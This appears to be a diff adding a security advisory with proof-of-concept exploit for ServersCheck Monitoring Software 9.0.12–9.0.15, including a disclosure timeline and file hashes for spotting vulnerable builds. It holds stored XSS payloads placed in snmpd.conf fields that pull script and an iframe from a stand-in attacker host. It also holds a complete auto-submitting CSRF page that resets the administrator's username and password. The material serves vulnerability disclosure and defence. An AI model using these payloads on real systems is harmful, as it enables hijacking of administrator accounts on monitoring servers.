@@ -1,0 +1,66 @@
+# Author: loneferret of Offensive Security
+# Product: ServersCheck Monitoring Software
+# Version: 9.0.12 - 9.0.14 (some versions of 9.0.15)
+# Vendor Site: http://www.serverscheck.com
+# Software Download: http://www.serverscheck.com/monitoring_software/download.asp
+# Note: Older Appliances may be affected.
+
+# Discovered: August 18th 2012
+# Disclosure: 
+# August 18th 2012: Reported to CERT
+# September 5th 2012: Tentative disclosure date October 10th 2012
+# September 5th 2012: Vendor requesting information/procedure on how to reproduce
+# September 5th 2012: Sent vendor procedures
+# September 5th 2012: Vendor says newer version not affected
+# September 5th 2012: Tested new version, conclusion still affected
+# September 5th 2012: Newer s-server.exe file supplied/tested version is patched.
+# September 6th 2012: 9.0.15 download version is now patched.
+# October 10th 2012: Public release
+
+
+# Software Description:
+# The core of our Monitoring Solution is the award winning ServersCheck Monitoring Software. 
+# This software enables you to monitor any networked device for its availability 
+# and performance. It is agentless: no need to have agents installed on the remote 
+# systems being monitored. It can run on your own Windows system or you can 
+# get it as a box: the ServersCheck Monitoring Appliance. 
+
+# Vulnerabilities:
+# The file responsible the vulnerability is called "s-server.exe".
+# From the 3 versions tested the file's version does not change, so looking at the 
+# MD5 hash can help us determine if an installation is using vulnerable file.
+# One can only assume that 9.0.13 is vulnerable.
+# Versions 9.0.12 & 9.0.14 & 9.0.15 (vulnerable): 
+# s-server.exe HASH: MD5 (s-server.exe) = af38d77e0b150d96f68cba4c3e65f316
+# Version 9.0.15 (patched):
+# s-server.exe HASH: MD5 (s-server.exe) = 3e01ff7201df4eb1c0091784a40f3055
+
+# PoC:
+# Store XSS & Cross Site Request Forgery
+# The XSS is triggered by configuring a snmpd.conf file to point to an attacker-controlled
+# JavaScript file. 
+# ..
+# syslocation <script src="http://attacker/xss.js"></script>
+# syscontact <iframe src="http://attacker/scheck-csrf.html"></iframe>
+
+# CSRF PoC:
+# We can also use the previous XSS to trigger this. Makes for a funny.
+# Change Admin credentials
+# File scheck-csrf.html
+<html>
+ <body onload="trigger()">
+ <script>
+        function trigger() {
+                document.getElementById('bad_form').submit();
+        }
+ </script>
+ <form id="bad_form" method="post" action="http://target:1272/settings2.html">
+  <input name="systemsetting" value="secure" type="hidden">
+  <input name="setting" value="SECURE" type="hidden">
+  <input value="ok" name="changedsettings" type="hidden">
+  <input name="systemsetting" value="SECURE" type="hidden">
+  <input name="XYXadminuser" size="30" value="loneferret" type="hidden"><br>
+  <input name="adminpass" size="30" value="123456" type="hidden"><br>
+ </form>
+ </body>
+</html>
